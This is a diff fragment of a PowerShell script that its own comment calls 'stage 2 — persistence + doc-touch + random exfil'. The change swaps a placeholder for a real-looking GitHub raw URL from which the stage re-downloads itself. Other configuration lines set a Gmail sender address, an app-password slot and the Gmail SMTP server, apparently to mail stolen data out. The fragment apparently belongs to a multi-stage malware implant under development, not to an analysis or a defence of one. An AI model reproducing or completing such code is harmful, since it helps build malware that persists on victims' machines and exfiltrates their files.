@@ -2,7 +2,7 @@
 # stage 2 — persistence + doc-touch + random exfil.
 
 # ---------- CONFIG ----------
-$SelfUrl    = "https://your.host/s2.ps1"     # must match stage 1
+$SelfUrl = "https://raw.githubusercontent.com/QmFkLVBp/duqndnaidnznhnyf32yfz18nqynmdbmYQBCMB/main/ps1/s2.ps1"
 $Sender     = "vaildus81@gmail.com"
 $AppPass    = "FILL_APP_PASSWORD"             # 16-char Gmail app password, not account pass
 $Smtp       = "smtp.gmail.com"                # was "://gmail.com" — fix
